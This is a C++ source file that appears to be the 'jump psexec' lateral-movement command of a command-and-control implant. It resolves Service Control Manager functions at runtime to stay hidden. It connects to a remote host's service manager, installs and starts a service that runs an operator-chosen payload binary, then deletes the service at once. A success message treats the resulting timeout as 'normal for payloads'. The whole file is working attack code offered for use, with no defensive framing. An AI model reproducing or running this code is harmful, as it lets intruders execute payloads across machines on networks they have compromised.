#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_JUMP_PSEXEC

using namespace stardust;
using namespace starburst;

typedef SC_HANDLE (WINAPI *fnOpenSCManagerW)( LPCWSTR, LPCWSTR, DWORD );
typedef SC_HANDLE (WINAPI *fnCreateServiceW)( SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR );
typedef BOOL (WINAPI *fnStartServiceW)( SC_HANDLE, DWORD, LPCWSTR* );
typedef BOOL (WINAPI *fnDeleteService)( SC_HANDLE );
typedef BOOL (WINAPI *fnCloseServiceHandle)( SC_HANDLE );

auto declfn starburst::cmd_jump_psexec(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );
    if ( !host_str || host_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
        return;
    }

    uint32_t svc_name_len = 0;
    auto svc_name = parser_string( params, &svc_name_len );

    uint32_t bin_path_len = 0;
    auto bin_path = parser_string( params, &bin_path_len );
    if ( !bin_path || bin_path_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no binary path provided" ) ) );
        return;
    }

    HMODULE h_advapi = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "advapi32.dll" ) ) );
    if ( !h_advapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load advapi32" ) ) );
        return;
    }

    auto pOpenSCManagerW = reinterpret_cast<fnOpenSCManagerW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "OpenSCManagerW" ) ) ) );
    auto pCreateServiceW = reinterpret_cast<fnCreateServiceW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "CreateServiceW" ) ) ) );
    auto pStartServiceW = reinterpret_cast<fnStartServiceW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "StartServiceW" ) ) ) );
    auto pDeleteService = reinterpret_cast<fnDeleteService>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "DeleteService" ) ) ) );
    auto pCloseServiceHandle = reinterpret_cast<fnCloseServiceHandle>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "CloseServiceHandle" ) ) ) );

    if ( !pOpenSCManagerW || !pCreateServiceW || !pStartServiceW ||
         !pDeleteService || !pCloseServiceHandle ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve SC APIs" ) ) );
        return;
    }

    wchar_t w_host[256] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_str, host_len, w_host, 255 );

    wchar_t w_svc[128] = {};
    if ( svc_name && svc_name_len > 0 ) {
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, svc_name, svc_name_len, w_svc, 127 );
    } else {
        wchar_t def[] = { 'S','t','a','r','S','v','c', 0 };
        for ( int i = 0; i < 8; i++ ) w_svc[i] = def[i];
    }

    wchar_t w_bin[512] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, bin_path, bin_path_len, w_bin, 511 );

    wchar_t unc_host[270] = { '\\', '\\', 0 };
    for ( int i = 0; i < 256 && w_host[i]; i++ )
        unc_host[i + 2] = w_host[i];

    SC_HANDLE h_scm = pOpenSCManagerW( unc_host, nullptr,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT );
    if ( !h_scm ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenSCManager failed - check perms/network" ) ) );
        return;
    }

    SC_HANDLE h_svc = pCreateServiceW(
        h_scm, w_svc, w_svc,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        w_bin,
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if ( !h_svc ) {
        pCloseServiceHandle( h_scm );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateService failed" ) ) );
        return;
    }

    BOOL started = pStartServiceW( h_svc, 0, nullptr );

    pDeleteService( h_svc );
    pCloseServiceHandle( h_svc );
    pCloseServiceHandle( h_scm );

    if ( started ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "service created and started successfully" ) ) );
    } else {
        DWORD err = inst.kernel32.GetLastError();
        if ( err == 1053 ) {
            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "service started (timeout - normal for payloads)" ) ) );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "StartService failed" ) ) );
        }
    }
}

#endif
